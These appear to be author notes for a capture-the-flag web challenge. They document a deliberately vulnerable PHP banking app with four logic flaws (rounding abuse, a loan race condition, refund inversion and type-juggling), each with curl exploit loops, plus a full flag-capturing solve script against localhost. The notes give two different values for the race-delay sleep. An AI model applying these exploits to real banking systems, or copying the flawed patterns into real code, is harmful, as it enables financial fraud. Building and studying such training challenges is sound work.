# BankruptMe — Challenge Author Notes

**Category:** Web  
**Difficulty:** Hard  
**Points:** TBD  
**Flag:** Set via `FLAG` environment variable in `docker-compose.yml`

---

## Synopsis

Players are given access to a fake PHP banking portal for *CipherBank International*.  
They start with **1,000 MAD** and must reach **1,000,000 MAD** to unlock the `/vip.php` page and retrieve the flag.  
Four chained business-logic vulnerabilities lead to the goal. No SQL injection, no RCE, no auth bypass — pure logic.

---

## Quick Start

```bash
cd challenges/web/bankruptme
docker compose up --build -d
# App running at http://localhost:8080
```

To change the flag:
```bash
# Edit docker-compose.yml → services.web.environment.FLAG
docker compose up -d --force-recreate web
```

---

## Vulnerability Chain

### STEP 1 — Currency Rounding Abuse
**File:** `src/Controllers/TransferController.php`

The sender is debited the **rounded** (2 d.p.) value, but the receiver is credited the **raw float**.

```
transfer(0.004):
  deducted  = round(0.004, 2) = 0.00
  credited  =             0.004
  net gain  = +0.004 MAD per call
```

**Exploit:** Transfer `0.004` to your own account in a loop.

```bash
# Register and log in first, capture cookies.txt
curl -c cookies.txt -b cookies.txt -X POST http://localhost:8080/login.php \
  -d "username=player1&password=yourpassword"

# Loop 500 times — net gain ≈ 2 MAD (demonstrates the bug; not the primary path to 1M)
for i in $(seq 1 500); do
  curl -s -b cookies.txt -X POST http://localhost:8080/transfer.php \
    -d "recipient=player1&amount=0.004" > /dev/null
done
```

> **Intended use:** Shows the concept and earns a few MAD. The real escalation is Step 2.

---

### STEP 2 — Loan Race Condition  *(primary path)*
**File:** `src/Controllers/LoanController.php`

Eligibility is checked with a plain `SELECT COUNT(*)` — **no `FOR UPDATE`, no mutex**.  
The controller also adds an artificial `usleep(80000)` to widen the race window.

```
Thread A: SELECT loan_count → 0  ←─┐
Thread B: SELECT loan_count → 0  ←─┘  (both pass the guard)
Thread A: INSERT loan + credit +500,000 MAD
Thread B: INSERT loan + credit +500,000 MAD
Result: user holds 2 loans = 1,000,000 MAD → VIP
```

**Exploit:** Fire two simultaneous POST requests.

```bash
# Two parallel curl requests
curl -s -b cookies.txt -X POST http://localhost:8080/loan.php &
curl -s -b cookies.txt -X POST http://localhost:8080/loan.php &
wait

# Verify balance
curl -s -b cookies.txt http://localhost:8080/index.php | grep -o '[0-9,]* MAD' | head -1
```

> **If the race doesn't land first try**, add more parallelism:
> ```bash
> for i in 1 2 3 4; do
>   curl -s -b cookies.txt -X POST http://localhost:8080/loan.php &
> done; wait
> ```

---

### STEP 3 — Refund Logic Inversion  *(alternative path)*
**File:** `src/Controllers/RefundController.php`

The controller credits the user **first**, then attempts to debit the merchant in a separate try/catch.  
All seed merchants start with `balance = 0.00`.  
The merchant debit silently fails (or drives balance negative) — the user's credit is never rolled back.

```
1. UPDATE users SET balance = balance + 5000  ← always executes
2. UPDATE merchants SET balance = balance - 5000  ← fails silently (balance 0 → -5000, no constraint)
```

**Exploit:** Repeat until balance ≥ 1,000,000 (200 calls × 5,000 MAD).

```bash
for i in $(seq 1 200); do
  curl -s -b cookies.txt -X POST http://localhost:8080/refund.php \
    -d "merchant_id=1"
done
```

---

### STEP 4 — Type-Juggling Anti-Fraud Bypass
**File:** `src/Controllers/TransferController.php`

The anti-fraud cap uses an `(int)` cast on the raw POST string before the `> 10000` comparison.

| Input  | `(int)$val` | `(float)$val` | Guard passes? |
|--------|-------------|---------------|---------------|
| `9999` | 9999        | 9999.0        | No (under limit) |
| `10001`| 10001       | 10001.0       | Blocked ✓ |
| `1e5`  | **1**       | **100000.0**  | **Yes — bypass!** |
| `1e6`  | **1**       | **1000000.0** | **Yes — bypass!** |

PHP parses the string `"1e5"` as integer `1` (stops at `'e'`), but `(float)"1e5"` = 100000.  
The guard sees `1 > 10000` → false → allowed. The actual debit/credit uses the float.

**Exploit:** Transfer 1,000,000 MAD in a single call (requires sufficient balance first).

```bash
# Assume you have ≥ 1,000,000 MAD on account_A and want to move it to account_B
curl -s -b cookies_A.txt -X POST http://localhost:8080/transfer.php \
  -d "recipient=account_B&amount=1e6"
```

> **Practical use in the chain:**  
> After accumulating balance via Steps 1–3, use Step 4 to consolidate funds or transfer your  
> entire balance to a fresh account if your balance exceeds 10,000 MAD.

---

## Intended Solve Path (Fastest Route)

```
1. Register account (1,000 MAD starting balance — satisfies MIN_BALANCE = 100 MAD)
2. Fire two simultaneous POST /loan.php requests (race condition → 2 × 500,000 = 1,000,000 MAD)
3. Visit /vip.php → flag is displayed
```

One-liner solve script:

```bash
#!/usr/bin/env bash
BASE="http://localhost:8080"
JAR=$(mktemp)

# Register
curl -sc "$JAR" "$BASE/register.php" \
  -d "username=solver&email=solver@x.com&password=Solv3r!99" > /dev/null

# Login
curl -sc "$JAR" -b "$JAR" "$BASE/login.php" \
  -d "username=solver&password=Solv3r!99" > /dev/null

# Race condition — fire 4 simultaneous loan requests
for i in 1 2 3 4; do
  curl -s -b "$JAR" -X POST "$BASE/loan.php" &
done
wait

# Grab flag
curl -s -b "$JAR" "$BASE/vip.php" | grep -oP 'MCTF\{[^}]+\}'

rm -f "$JAR"
```

---

## Rabbit Holes (Intentional Distractions)

| Lure | Why it looks interesting | Why it's a dead end |
|------|--------------------------|---------------------|
| `/admin.php` | Visible in nav source, common target | Hard auth — `is_admin` checked in DB, not session |
| `debug=1` parameter | Mentioned in HTML comment on login page | Server-side code ignores it entirely |
| Base64 cookie header | Looks like encoded auth data | Decodes to a plain session ID — nothing actionable |
| SQL errors visible | `PDO::ERRMODE_EXCEPTION` surfaces some error strings | All queries use prepared statements — nothing injectable |

---

## File Structure

```
bankruptme/
├── config/
│   └── config.php              # DB config, constants, helpers
├── database/
│   └── schema.sql              # Auto-imported on container start
├── src/Controllers/
│   ├── AuthController.php      # Register / login / logout
│   ├── TransferController.php  # Step 1 (rounding) + Step 4 (type juggling)
│   ├── LoanController.php      # Step 2 (race condition)
│   └── RefundController.php    # Step 3 (logic inversion)
├── public/
│   ├── includes/layout.php     # Shared HTML header / nav
│   ├── index.php               # Dashboard
│   ├── login.php / register.php / logout.php
│   ├── transfer.php            # Step 1 + 4 entry point
│   ├── loan.php                # Step 2 entry point
│   ├── refund.php              # Step 3 entry point
│   ├── vip.php                 # Flag page (is_vip = 1 required)
│   ├── admin.php               # Rabbit hole (hard auth)
│   └── history.php             # Raw ledger (shows float vs rounded delta)
├── docker/
│   ├── Dockerfile
│   └── apache.conf
└── docker-compose.yml
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `FLAG`   | `MCTF{s3t_th3_FLAG_3nv_v4r}` | The challenge flag |
| `DB_HOST`| `db` | MySQL hostname |
| `DB_NAME`| `bankruptme` | Database name |
| `DB_USER`| `bankruptme` | DB username |
| `DB_PASS`| `bankruptme_secret` | DB password |

---

## Validator Notes

- The `/history.php` page shows **raw float amounts** alongside the **displayed (rounded) amounts** — this is the key hint for Step 1.
- The `usleep(500000)` in `LoanController::requestLoan()` is intentional; it makes the race window (500 ms) large enough to exploit reliably with basic curl parallelism. `session_write_close()` is called in `loan.php` before dispatching to the controller to release the PHP session file lock — without this, PHP serialises all concurrent requests on the same session ID, silently closing the race window.
- The `(int)` cast anti-fraud check (`TransferController.php:27`) looks like a reasonable guard to the untrained eye — that's the point.
- No vulnerability requires authentication bypass, SSRF, or any non-business-logic technique.
